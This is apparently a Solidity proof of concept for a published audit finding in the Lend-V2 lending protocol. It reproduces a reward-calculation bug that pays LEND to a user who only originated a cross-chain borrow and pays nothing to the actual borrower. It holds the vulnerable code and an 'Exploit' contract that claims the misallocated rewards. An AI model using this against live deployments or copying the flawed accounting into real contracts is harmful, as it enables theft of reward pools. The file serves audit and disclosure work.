// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend-V2 finding 58381 (H-12):
// "Incorrect LEND reward distribution for cross-chain borrows".
//
// Real audited source (the vulnerable reward calc + the two borrow helpers are
// reproduced VERBATIM, the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/LendStorage.sol
//   fns    distributeBorrowerLend (L342-375), borrowWithInterest (L478-504),
//          borrowWithInterestSame (L509-515)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/669
//
// Root cause: distributeBorrowerLend() sizes the borrower's LEND reward using
// borrowWithInterest(), which sums `crossChainBorrows` — borrows that
// ORIGINATED on this chain (collateral is here, debt executed elsewhere). What
// it should reward are borrows EXECUTED on this chain, stored in
// `crossChainCollaterals`. borrowWithInterest's collateral branch only counts an
// entry when BOTH destEid==currentEid AND srcEid==currentEid, which is
// impossible for a genuine cross-chain borrow (srcEid != destEid). Consequence:
//   - Alice, who actually borrowed ON this chain via cross-chain collateral,
//     accrues 0 LEND.
//   - Bob, who only ORIGINATED a borrow here (executed on another chain),
//     accrues the full LEND reward.
// Real on-chain borrowers get nothing; non-borrowers drain the LEND pool.
//
// The vulnerable arithmetic and both helpers are byte-for-byte the on-chain
// source; ExponentialNoError is copied verbatim from the repo. The lendtroller,
// lToken, LEND token and reward "claim" (mirrors CoreRouter.grantLendInternal:
// `IERC20(lend).safeTransfer(user, accrued)`) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

// ── ExponentialNoError — copied VERBATIM from Lend-V2/src/ExponentialNoError.sol ──
contract ExponentialNoError {
    uint256 constant expScale = 1e18;
    uint256 constant doubleScale = 1e36;
    uint256 constant halfExpScale = expScale / 2;
    uint256 constant mantissaOne = expScale;

    struct Exp {
        uint256 mantissa;
    }

    struct Double {
        uint256 mantissa;
    }

    function truncate(Exp memory exp) internal pure returns (uint256) {
        return exp.mantissa / expScale;
    }

    function mul_ScalarTruncate(Exp memory a, uint256 scalar) internal pure returns (uint256) {
        Exp memory product = mul_(a, scalar);
        return truncate(product);
    }

    function mul_ScalarTruncateAddUInt(Exp memory a, uint256 scalar, uint256 addend) internal pure returns (uint256) {
        Exp memory product = mul_(a, scalar);
        return add_(truncate(product), addend);
    }

    function safe224(uint256 n, string memory errorMessage) internal pure returns (uint224) {
        require(n < 2 ** 224, errorMessage);
        return uint224(n);
    }

    function add_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: add_(a.mantissa, b.mantissa)});
    }

    function add_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: add_(a.mantissa, b.mantissa)});
    }

    function add_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: sub_(a.mantissa, b.mantissa)});
    }

    function sub_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: sub_(a.mantissa, b.mantissa)});
    }

    function sub_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: mul_(a.mantissa, b.mantissa) / expScale});
    }

    function mul_(Exp memory a, uint256 b) internal pure returns (Exp memory) {
        return Exp({mantissa: mul_(a.mantissa, b)});
    }

    function mul_(uint256 a, Exp memory b) internal pure returns (uint256) {
        return mul_(a, b.mantissa) / expScale;
    }

    function mul_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: mul_(a.mantissa, b.mantissa) / doubleScale});
    }

    function mul_(Double memory a, uint256 b) internal pure returns (Double memory) {
        return Double({mantissa: mul_(a.mantissa, b)});
    }

    function mul_(uint256 a, Double memory b) internal pure returns (uint256) {
        return mul_(a, b.mantissa) / doubleScale;
    }

    function mul_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div_(Exp memory a, Exp memory b) internal pure returns (Exp memory) {
        return Exp({mantissa: div_(mul_(a.mantissa, expScale), b.mantissa)});
    }

    function div_(Exp memory a, uint256 b) internal pure returns (Exp memory) {
        return Exp({mantissa: div_(a.mantissa, b)});
    }

    function div_(uint256 a, Exp memory b) internal pure returns (uint256) {
        return div_(mul_(a, expScale), b.mantissa);
    }

    function div_(Double memory a, Double memory b) internal pure returns (Double memory) {
        return Double({mantissa: div_(mul_(a.mantissa, doubleScale), b.mantissa)});
    }

    function div_(Double memory a, uint256 b) internal pure returns (Double memory) {
        return Double({mantissa: div_(a.mantissa, b)});
    }

    function div_(uint256 a, Double memory b) internal pure returns (uint256) {
        return div_(mul_(a, doubleScale), b.mantissa);
    }

    function div_(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

// ── minimal interfaces used by the verbatim functions ──
interface LTokenInterface {
    function borrowIndex() external view returns (uint256);
}

interface LendtrollerInterfaceV2 {
    function triggerBorrowIndexUpdate(address lToken) external;
    function lendBorrowState(address lToken) external view returns (uint224, uint32);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

// ── faithful minimal doubles ──

/// @dev The LEND reward token (drained by the wrong borrower).
contract MiniToken {
    string public name = "Lend Reward Token";
    string public symbol = "LEND";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful lToken double: exposes a fixed borrow index (1e18 = no accrued
///      interest since last update, so reward math is exact and easy to read).
contract LToken is LTokenInterface {
    uint256 public borrowIndex = 1e18;
}

/// @dev Faithful lendtroller double: the LEND market's borrow-state index has
///      advanced from the initial 1e36 to 2e36 (one unit of accrued LEND per
///      borrowed token). triggerBorrowIndexUpdate is a no-op here.
contract Lendtroller is LendtrollerInterfaceV2 {
    uint224 public borrowStateIndex = 2e36;

    function triggerBorrowIndexUpdate(address) external override {}

    function lendBorrowState(address) external view override returns (uint224, uint32) {
        return (borrowStateIndex, uint32(block.number));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — distributeBorrowerLend + borrowWithInterest +
// borrowWithInterestSame are reproduced VERBATIM from LendStorage.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage is ExponentialNoError {
    address public lendtroller;
    uint256 public currentEid;
    uint224 public constant LEND_INITIAL_INDEX = 1e36;

    struct Borrow {
        uint256 srcEid; // Source chain's layer zero endpoint id
        uint256 destEid; // Destination chain's layer zero endpoint id
        uint256 principle; // Borrowed token amount
        uint256 borrowIndex; // Borrow index
        address borrowedlToken; // Address of the borrower
        address srcToken; // Source token address
    }

    struct BorrowMarketState {
        uint256 amount;
        uint256 borrowIndex;
    }

    mapping(address lToken => address underlying) public lTokenToUnderlying;
    mapping(address lToken => mapping(address user => uint256 lendBorrowerIndex)) public lendBorrowerIndex;
    mapping(address user => uint256 lendAccrued) public lendAccrued;
    mapping(address borrower => mapping(address underlying => Borrow[])) public crossChainBorrows;
    mapping(address borrower => mapping(address underlying => Borrow[])) public crossChainCollaterals;
    mapping(address user => mapping(address lToken => BorrowMarketState borrowBalance)) public borrowBalance;
    mapping(address contractAddress => bool isAuthorized) public authorizedContracts;

    modifier onlyAuthorized() {
        require(authorizedContracts[msg.sender], "Caller not authorized");
        _;
    }

    constructor(address _lendtroller, uint32 _currentEid) {
        lendtroller = _lendtroller;
        currentEid = _currentEid;
        authorizedContracts[msg.sender] = true;
    }

    // ── minimal faithful setters for test wiring ──
    function setLTokenToUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }

    function addCrossChainBorrow(address user, address underlying, Borrow memory b) external {
        crossChainBorrows[user][underlying].push(b);
    }

    function addCrossChainCollateral(address user, address underlying, Borrow memory b) external {
        crossChainCollaterals[user][underlying].push(b);
    }

    // ── VERBATIM: distributeBorrowerLend (LendStorage.sol L342-375) ──
    function distributeBorrowerLend(address lToken, address borrower) external onlyAuthorized {
        // Trigger borrow index update
        LendtrollerInterfaceV2(lendtroller).triggerBorrowIndexUpdate(lToken);

        // Get the appropriate lend state based on whether it's for supply or borrow
        (uint224 borrowIndex,) = LendtrollerInterfaceV2(lendtroller).lendBorrowState(lToken);

        uint256 borrowerIndex = lendBorrowerIndex[lToken][borrower];

        // Update borrowers's index to the current index since we are distributing accrued LEND
        lendBorrowerIndex[lToken][borrower] = borrowIndex;

        if (borrowerIndex == 0 && borrowIndex >= LEND_INITIAL_INDEX) {
            // Covers the case where users borrowed tokens before the market's borrow state index was set.
            // Rewards the user with LEND accrued from the start of when borrower rewards were first
            // set for the market.
            borrowerIndex = LEND_INITIAL_INDEX;
        }

        // Calculate change in the cumulative sum of the LEND per borrowed unit accrued
        Double memory deltaIndex = Double({mantissa: sub_(borrowIndex, borrowerIndex)});

        // Calculate the appropriate account balance and delta based on supply or borrow
        uint256 borrowerAmount = div_(
            add_(
                borrowWithInterest(borrower, lToken), // @> VULN: sums crossChainBorrows (borrows ORIGINATED here) not crossChainCollaterals (borrows EXECUTED here) — real borrowers get 0, non-borrowers get rewarded
                borrowWithInterestSame(borrower, lToken)
            ),
            Exp({mantissa: LTokenInterface(lToken).borrowIndex()})
        );

        // Calculate LEND accrued: lTokenAmount * accruedPerBorrowedUnit
        uint256 borrowerDelta = mul_(borrowerAmount, deltaIndex);

        uint256 borrowerAccrued = add_(lendAccrued[borrower], borrowerDelta);
        lendAccrued[borrower] = borrowerAccrued;
    }

    // ── VERBATIM: borrowWithInterest (LendStorage.sol L478-504) ──
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }

    // ── VERBATIM: borrowWithInterestSame (LendStorage.sol L509-515) ──
    function borrowWithInterestSame(address borrower, address _lToken) public view returns (uint256) {
        uint256 borrowIndex = borrowBalance[borrower][_lToken].borrowIndex;
        uint256 borrowBalanceSameChain = borrowIndex != 0
            ? (borrowBalance[borrower][_lToken].amount * uint256(LTokenInterface(_lToken).borrowIndex())) / borrowIndex
            : 0;
        return borrowBalanceSameChain;
    }
}

/// @dev Faithful stand-in for CoreRouter.claimLend/grantLendInternal: hands the
///      user exactly `lendStorage.lendAccrued(user)` LEND tokens from the pool.
///      (Real code: `IERC20(lendAddress).safeTransfer(user, amount)`.)
contract Distributor {
    LendStorage public lendStorage;
    MiniToken public lend;

    constructor(LendStorage _lendStorage, MiniToken _lend) {
        lendStorage = _lendStorage;
        lend = _lend;
    }

    function claim(address user) external returns (uint256 amount) {
        amount = lendStorage.lendAccrued(user);
        if (amount > 0) {
            lend.transfer(user, amount);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver. Bob (the attacker = this contract) only ORIGINATED a borrow on
// this chain (executed elsewhere) → crossChainBorrows. Alice is a real borrower
// EXECUTED on this chain → crossChainCollaterals. distributeBorrowerLend rewards
// Bob and gives Alice nothing; Bob then claims LEND he never earned.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit is ExponentialNoError {
    MiniToken public lend;
    LToken public lToken;
    Lendtroller public lendtroller;
    LendStorage public lendStorage;
    Distributor public distributor;

    address public constant ALICE = address(0xA11CE); // real borrower on this chain
    // Bob == address(this) (the attacker)

    uint256 public constant CURRENT_EID = 1; // "this" chain
    uint256 public constant OTHER_EID = 2; // the other chain
    uint256 public constant PRINCIPLE = 10_000e18; // each borrowed 10,000 tokens
    uint256 public constant LEND_POOL = 20_000e18; // finite LEND reward pool

    uint256 public aliceLend; // LEND the real borrower received (should be > 0, is 0)
    uint256 public bobLend; // LEND the non-borrower received (should be 0, is > 0)

    constructor() {
        lend = new MiniToken(); //          child nonce 1  (drained LEND token)
        lToken = new LToken(); //           child nonce 2
        lendtroller = new Lendtroller(); // child nonce 3
        lendStorage = new LendStorage(address(lendtroller), uint32(CURRENT_EID)); // child nonce 4 (VULN)
        distributor = new Distributor(lendStorage, lend); // child nonce 5

        // fund the reward pool
        lend.mint(address(distributor), LEND_POOL);

        address underlying = address(lend); // reuse as the borrowed underlying key
        lendStorage.setLTokenToUnderlying(address(lToken), underlying);

        // Alice: a genuine cross-chain borrow EXECUTED on THIS chain (srcEid=other,
        // destEid=this). Stored in crossChainCollaterals — the correct place.
        lendStorage.addCrossChainCollateral(
            ALICE,
            underlying,
            LendStorage.Borrow({
                srcEid: OTHER_EID,
                destEid: CURRENT_EID,
                principle: PRINCIPLE,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: underlying
            })
        );

        // Bob: only ORIGINATED a borrow here; it was executed on the other chain
        // (srcEid=this, destEid=other). Stored in crossChainBorrows.
        lendStorage.addCrossChainBorrow(
            address(this),
            underlying,
            LendStorage.Borrow({
                srcEid: CURRENT_EID,
                destEid: OTHER_EID,
                principle: PRINCIPLE,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: underlying
            })
        );
    }

    function run() external {
        // Protocol distributes LEND to both borrowers (same accrued index delta).
        lendStorage.distributeBorrowerLend(address(lToken), ALICE);
        lendStorage.distributeBorrowerLend(address(lToken), address(this));

        // Realize the rewards as actual token transfers.
        aliceLend = distributor.claim(ALICE);
        bobLend = distributor.claim(address(this));

        // harm: the real on-chain borrower (Alice) gets ZERO LEND, while the
        // non-borrower (Bob) drains the reward pool.
        require(aliceLend == 0, "real borrower unexpectedly rewarded");
        require(bobLend == PRINCIPLE, "non-borrower did not receive full reward");
        require(lend.balanceOf(address(this)) == PRINCIPLE, "attacker did not receive LEND");
    }
}
